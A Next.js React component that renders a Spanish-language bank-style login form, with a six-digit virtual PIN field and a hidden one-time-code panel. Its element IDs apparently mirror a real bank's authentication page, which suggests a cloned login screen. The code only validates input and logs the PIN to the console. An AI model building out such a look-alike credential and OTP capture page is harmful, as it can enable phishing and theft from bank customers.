/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
/* eslint-disable jsx-a11y/alt-text */
"use client";
import { useState } from "react";

const Dinamica = () => {
  const [clave, setClave] = useState("");
  const [error, setError] = useState("");

  // ⭐ Validar clave virtual (solo números y máximo 6)
  const handleClaveChange = (e: any) => {
    let value = e.target.value;

    // Permitir solo números
    value = value.replace(/[^0-9]/g, "");

    // Limitar a 6 dígitos
    if (value.length > 6) value = value.slice(0, 6);

    setClave(value);

    const hiddenInput = document.getElementById(
      "formAutenticar:claveVirtual"
    ) as HTMLInputElement;

    if (hiddenInput) hiddenInput.value = value;

    // Borrar error si está corrigiendo
    if (value.length === 6) setError("");
  };

  // ⭐ Validación al enviar
  const handleSubmit = (e: any) => {
    e.preventDefault();

    if (clave.length !== 6) {
      setError("La clave debe tener exactamente 6 dígitos");
      return;
    }

    console.log("Clave enviada:", clave);
  };

  return (
    <div className="container">
      <form
        id="formAutenticar"
        name="formAutenticar"
        method="post"
        action=""
        className="form-login"
        encType="application/x-www-form-urlencoded"
        target="_top"
        autoComplete="off"
        onSubmit={handleSubmit}
      >
        <div id="formAutenticar:loginp" className="loginp">
          <div className="wrap container-fluid">
            <div id="formAutenticar:panelContainer" className="form-container">
              <script dangerouslySetInnerHTML={{ __html: `var JDID = "";` }} />

              <div id="formAutenticar:panelGroupMain" className="auth-form-container">
                <div className="auth-form__logo"></div>

                <h2 className="auth-form__title">¡Hola!</h2>
                <h3 className="auth-form__subtitle">Nos alegra que esté aquí</h3>

                {/* Clave virtual */}
                <div id="formAutenticar:panelClaveVirtual" className="form-field__clave-virtual">
                  <label htmlFor="formAutenticar:claveVirtualMask">
                    Ingrese su clave virtual
                  </label>

                  <input
                    id="formAutenticar:claveVirtualMask"
                    type="password"
                    maxLength={6}
                    autoComplete="off"
                    placeholder="******"
                    value={clave}
                    onChange={handleClaveChange}
                  />

                  <input id="formAutenticar:claveVirtual" type="hidden" />
                  <input id="formAutenticar:claveVirtualCrypto" type="hidden" />

                  <div className="error-message-container__clave-virtual">
                    <p id="pClaveVirtual" className="error-message-content">
                      {error}
                    </p>
                  </div>
                </div>

                {/* OTP (oculto por ahora) */}
                <div
                  id="formAutenticar:panelOTP"
                  className="form-field__otp"
                  style={{ display: "none" }}
                >
                  <label htmlFor="formAutenticar:otp">
                    Ingrese el código que enviamos a su celular
                  </label>

                  <input
                    id="formAutenticar:otpMask"
                    type="text"
                    maxLength={8}
                    autoComplete="off"
                  />

                  <input id="formAutenticar:otp" type="hidden" />
                  <input id="formAutenticar:otpCrypto" type="hidden" />

                  <div className="error-message-container__otp">
                    <img src="css/error-icono.svg" className="error-message-icon" />
                    <p className="error" id="pOtp"></p>
                  </div>

                  <div className="form-field__counter">
                    Podrá solicitar otro código en <span id="timer">00:00</span>
                  </div>
                </div>

                {/* Botón */}
                <div id="formAutenticar:button-container" className="submit">
                  <input
                    id="formAutenticar:btnSubmitCont"
                    type="submit"
                    value="Validar"
                    className="btn-red continuar"
                  />
                </div>

                <div className="form-divider"></div>

                <div className="form-link-olvido">
                  <a href="#">¿Olvidó su clave?</a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </form>
    </div>
  );
};

export default Dinamica;